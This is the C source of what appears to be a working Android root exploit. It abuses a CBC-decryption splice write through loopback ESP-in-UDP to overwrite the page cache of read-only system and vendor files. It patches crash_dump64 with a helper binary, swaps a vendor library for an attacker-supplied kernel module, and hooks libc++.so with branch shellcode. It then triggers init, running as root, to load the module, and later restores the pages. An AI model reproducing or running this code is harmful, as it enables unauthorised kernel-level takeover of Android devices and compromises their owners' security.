#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "aes256.h"

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
static char    *libcxx_ko_target;

static int      g_encap_port;
static int      g_sender_port;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint32_t g_seq = 1;
static const char *g_ko_path;
struct PatchRestore {
    const char *lib;
    uint64_t    tramp_aligned;
    uint8_t     tramp_orig[16];
    uint64_t    shell_off;
    uint32_t    shell_padded;
    char        shell_orig[1024];
    int         valid;
};

static struct PatchRestore g_libcxx_r;

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
 * Pass mode="r" for read, NULL for write-splice.
 * Returns waitpid status, or -1 if clone fails (already logged).
 */
static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const char *mode)
{
    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
        if (mode)
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, mode, NULL);
        else
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
        _exit(1);
    }
    int st = 0;
    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
    return st;
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 */
static int read_vendor_content(off_t offset, uint8_t buf[16]) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }

    int status = spawn_crash_dump(offset, rdpipe[1], 0, "r");
    close(rdpipe[1]);
    int n = 0;
    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
    close(rdpipe[0]);
    if (status < 0) return -1;
    if (n != 16) {
        if (WIFEXITED(status)) {
            static const char *const exit_meanings[] = {
                [0] = "success",
                [1] = "open vendor file failed or read returned < 16 bytes",
                [2] = "write to pipe returned < 16 bytes",
                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
            };
            int ec = WEXITSTATUS(status);
            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
            printf("read_vendor at 0x%lx got %d bytes: %s\n",
                     (long)offset, n, meaning);
        } else if (WIFSIGNALED(status))
            printf("read_vendor at 0x%lx got %d bytes: signal %d\n",
                     (long)offset, n, WTERMSIG(status));
        else
            printf("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
                     (long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC write.
 * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
 * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
 * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
 */
static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
                            const uint8_t iv[16], int use_helper) {
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(g_seq++);
    memcpy(hdr + 8, iv, 16);

    struct iovec iov = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
        printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
    }

    if (use_helper) {
        int st = spawn_crash_dump(offset, pipe_wr, 1, NULL);
        if (st < 0) return -1;
        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            printf("splice helper failed status=0x%x\n", st);
            return -1;
        }
    } else {
        off_t off = offset;
        if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
            printf("splice file failed: %s\n", strerror(errno)); return -1;
        }
    }

    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
    return 0;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * For system files (use_helper=0): reads old_content with pread().
 * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
 * len must be a multiple of 16.
 */
static int patch_file_cbc(const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper) {
    if (len % 16 != 0) {
        printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { printf("socket failed: %s\n", strerror(errno)); return -1; }
    int opt = 1;
    setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in src = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_sender_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_encap_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        printf("connect failed: %s\n", strerror(errno));
        close(sk_send); return -1;
    }

    int file_fd = -1;
    if (!use_helper) {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            printf("open %s failed: %s\n", path, strerror(errno));
            close(sk_send); return -1;
        }
    }

    int pfd[2];
    if (pipe(pfd) < 0) {
        printf("pipe failed: %s\n", strerror(errno));
        if (!use_helper) close(file_fd);
        close(sk_send);
        return -1;
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (use_helper) {
            if (read_vendor_content(off, old_content) < 0) {
                rc = -1; break;
            }
        } else {
            if (pread(file_fd, old_content, 16, off) != 16) {
                printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
                rc = -1; break;
            }
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
            printf("write #%zu at 0x%lx failed\n", i, (long)off);
            rc = -1; break;
        }
    }

    close(pfd[0]); close(pfd[1]);
    if (!use_helper) close(file_fd);
    close(sk_send);
    if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
    return rc;
}

/* ---- splicehelper blob ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char splice_helper_start[], splice_helper_end[];

/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}

/* Read an entire file into a malloc'd buffer; length written to *out_len. */
static char *read_file(const char *path, size_t *out_len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) { printf("open %s failed: %s\n", path, strerror(errno)); return NULL; }
    struct stat st;
    if (fstat(fd, &st) != 0 || st.st_size <= 0) { close(fd); return NULL; }
    char *buf = malloc((size_t)st.st_size);
    if (!buf) { close(fd); return NULL; }
    ssize_t n = read(fd, buf, (size_t)st.st_size);
    close(fd);
    if (n != st.st_size) { free(buf); return NULL; }
    *out_len = (size_t)n;
    return buf;
}

/* Write splicehelper into crash_dump64 page cache. */
static int patch_helper(void) {
    size_t len;
    char *buf = pad16(splice_helper_start,
                      (size_t)(splice_helper_end - splice_helper_start), &len);
    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }

    uint8_t verify[16];
    int vfd = open(kCrashDump, O_RDONLY);
    if (vfd >= 0) {
        ssize_t n = pread(vfd, verify, 16, 16);
        close(vfd);
        if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
            printf("patch: crash_dump64 verification failed\n");
            printf("patch: DEVICE NOT VULNERABLE\n");
            free(buf);
            return -1;
        }
    }
    free(buf);
    return 0;
}

static int patch_ko(void) {
    size_t ko_len = 0;
    char *ko_buf = read_file(g_ko_path, &ko_len);
    if (!ko_buf) { printf("read %s failed\n", g_ko_path); return 1; }

    size_t len;
    char *buf = pad16(ko_buf, ko_len, &len);
    free(ko_buf);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
    printf("patch: %s <- %s (%zu bytes)\n", libcxx_ko_target, g_ko_path, len);
    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
    free(buf);
    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
    return ret;
}

static void cleanup(void) {
    if (!g_libcxx_r.valid) return;
    printf("\n=== cleanup ===\n");
    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
                   (size_t)g_libcxx_r.tramp_aligned, 0);
    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
                   (size_t)g_libcxx_r.shell_off, 0);
}

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     size_t shellcode_size);

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy, struct PatchRestore *restore) {
    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }

    if (padded > sizeof(restore->shell_orig)) {
        printf("shellcode too large to save (%zu)\n", padded);
        free(buf); return -1;
    }

    uint64_t hook_off, shell_off; uint32_t first_insn;
    printf("Finding symbol offsets for %s:\n", lib);
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
    }
    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);

    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) {
        printf("%s already patched\n", lib); free(buf); return 0;
    }
    uint32_t jmpback = BRANCH |
        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
    *(uint32_t *)&buf[stage_len - 4] = jmpback;
    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;

    uint64_t aligned = hook_off & ~(uint64_t)15;
    int fd = open(lib, O_RDONLY);
    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
    int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
          && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
    close(fd);
    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }

    restore->lib           = lib;
    restore->shell_off     = shell_off;
    restore->shell_padded  = (uint32_t)padded;
    restore->tramp_aligned = aligned;
    restore->valid         = 1;

    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
    free(buf);
    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }

    int pos = (int)(hook_off & 15);
    uint8_t blk[16];
    memcpy(blk, restore->tramp_orig, 16);
    memcpy(&blk[pos], &hook_insn, 4);
    printf("patch: %s <- trampoline (16 bytes)\n", lib);
    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
    return ret2;
}

static int createOrphanProcess(void) {
    printf("Triggering hook...\n");
    int pid = fork();
    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

static const char *detect_ko_target(void) {
    static const char *const candidates[] = {
        "/vendor/lib64/libbinderdebug.so",
        "/vendor/lib64/libstagefrighthw.so",
        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
    };
    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        if (access(candidates[i], F_OK) == 0)
            return candidates[i];
    }
    return candidates[0];
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
    if (strlen(hex) != len * 2) return -1;
    for (size_t i = 0; i < len; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

static void usage(const char *argv0) {
    fprintf(stderr,
            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX --ko FILE\n", argv0);
}

static int setup(int argc, char **argv) {
    int encap_port = 0, sender_port = 0;
    uint32_t spi = 0;
    uint8_t aes_key[32];
    int have_aes = 0;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "--encap-port") && i + 1 < argc)
            encap_port = atoi(argv[++i]);
        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
            sender_port = atoi(argv[++i]);
        else if (!strcmp(a, "--spi") && i + 1 < argc)
            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
        else if (!strcmp(a, "--ko") && i + 1 < argc)
            g_ko_path = argv[++i];
        else { usage(argv[0]); return 2; }
    }
    if (!encap_port || !sender_port || !spi || !have_aes || !g_ko_path) {
        usage(argv[0]); return 2;
    }

    g_encap_port  = encap_port;
    g_sender_port = sender_port;
    g_spi         = spi;
    g_seq         = 1;
    memcpy(g_aes_key, aes_key, 32);

    const char *ko_target = detect_ko_target();
    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
    strncpy(libcxx_ko_target, ko_target, 63);
    libcxx_ko_target[63] = '\0';

    printf("=== setup ===\n");
    printf("found ko_target: %s\n", ko_target);
    printf("encap port: %d\n", encap_port);
    printf("spi: 0x%x\n", spi);
    return 0;
}

static int exploit(void) {
    printf("\n=== exploit (patching files) ===\n");

    int rc = 3;
    if (patch_helper()) goto done;
    if (patch_ko()) goto done;
    if (patch_hook("/system/lib64/libc++.so",
                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   &g_libcxx_r)) goto done;

    rc = 2;
    usleep(500000);
    
    printf("\n=== init  ===\n");
    createOrphanProcess();

    // Success is signaled solely by the /dev/df mutex: the libc++ hook fired in
    // init (uid=0, tid=1) and insmod is being launched for our custom .ko.
    // The dfm*/dfme* markers were DFRoot's bundled bootstrap/ksud chain and
    // never appear when loading a standalone .ko.
    static const struct {
        const char *path;
        const char *msg;
        int         rc;
    } markers[] = {
        { "/dev/df",    "libc++: loading custom module",                    0 },
    };
    int seen[sizeof(markers)/sizeof(markers[0])] = {0};

    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
        usleep(10000);
        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
                seen[j] = 1;
                printf("%s\n", markers[j].msg);
                if (markers[j].rc >= 0) {
                    // insmod still runs from the patched libc++ page; wait for
                    // it to finish before cleanup() restores those pages.
                    usleep(2000000);
                    rc = markers[j].rc;
                    goto done;
                }
            }
        }
    }
    printf("timeout: ERROR - check logcat & dmesg\n");
done:
    if (rc == 3) printf("patch: ERROR - failed to patch files\n");
    return rc;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (setup(argc, argv) != 0) return 2;
    int rc = exploit();
    cleanup();
    return rc;
}
